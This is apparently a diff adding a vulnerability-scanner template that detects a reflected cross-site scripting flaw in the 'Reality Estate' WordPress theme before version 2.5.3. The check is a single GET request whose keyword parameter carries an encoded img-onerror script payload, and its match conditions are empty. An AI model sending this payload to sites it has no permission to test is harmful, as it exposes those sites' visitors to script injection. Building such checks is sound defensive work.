@@ -1,0 +1,21 @@
+id: wp-reality-estate-theme
+brief:
+    title: Reality Estate Multipurpose WP-Theme < 2.5.3 - Cross-Site Scripting
+    by: r3Y3r53
+    level: medium
+    about: Reflected XSS was discovered in the 'Reality | Estate Multipurpose WordPress Theme'.
+    label:
+        - wpscan
+        - xss
+        - wordpress
+        - wp
+        - wp-theme
+        - reality
+        - estate
+        - vuln
+    score: CVSS:6.1
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/properties-with-map/?status&keyword=%22%3E%3Cimg%20src=x%20onerror=(alert)(document.domain);//%22'
+      signs: []
